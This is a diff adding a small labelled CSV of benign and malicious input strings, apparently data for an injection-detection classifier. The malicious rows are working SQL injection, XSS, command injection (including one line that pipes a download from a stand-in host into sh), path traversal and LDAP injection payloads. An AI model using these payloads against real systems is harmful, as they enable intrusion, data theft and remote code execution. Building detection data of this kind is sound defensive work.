@@ -1,0 +1,21 @@
+payload,label,attack_type
+hello=world,benign,none
+/profile/settings,benign,none
+user@example.com,benign,none
+report.pdf,benign,none
+status=active,benign,none
+SELECT name FROM users,malicious,sql_injection
+' OR '1'='1,malicious,sql_injection
+UNION SELECT password FROM accounts,malicious,sql_injection
+<script>alert(1)</script>,malicious,xss
+<img src=x onerror=alert(1)>,malicious,xss
+javascript:document.cookie,malicious,xss
+; curl http://example.test/a | sh,malicious,command_injection
+$(whoami),malicious,command_injection
+&& powershell -enc payload,malicious,command_injection
+../../etc/passwd,malicious,path_traversal
+..\\..\\windows\\system32,malicious,path_traversal
+%2e%2e%2f%2e%2e%2fsecret,malicious,path_traversal
+*)(uid=*),malicious,ldap_injection
+(|(uid=*)(userPassword=*)),malicious,ldap_injection
+(&(cn=admin)(objectClass=*)),malicious,ldap_injection
